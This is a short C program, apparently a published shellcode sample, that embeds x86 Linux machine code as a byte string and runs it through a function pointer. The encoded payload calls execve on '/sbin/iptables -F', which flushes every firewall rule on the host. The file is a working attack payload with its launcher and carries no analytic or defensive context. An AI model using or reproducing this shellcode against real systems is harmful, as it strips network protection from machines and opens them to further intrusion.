#include <stdio.h>

char shellcode[]="\x68\x5a\x2d\x46\x5a\x68\x62\x6c\x65\x73\x68\x69\x70\x74\x61\x68\x69\x6e\x2f\x2f\x68\x2f\x2f\x73\x62\x89\xe6\x99\x89\xd0\x88\x56\x10\x88\x56\x13\xb0\x0b\x89\xf3\x89\x5e\x14\x8d\x4e\x14\xcd\x80";

int main()
{
	int (*ret)() = (int(*)())shellcode;
	printf("Size: %d bytes.\n", sizeof(shellcode)); 
	ret();
}
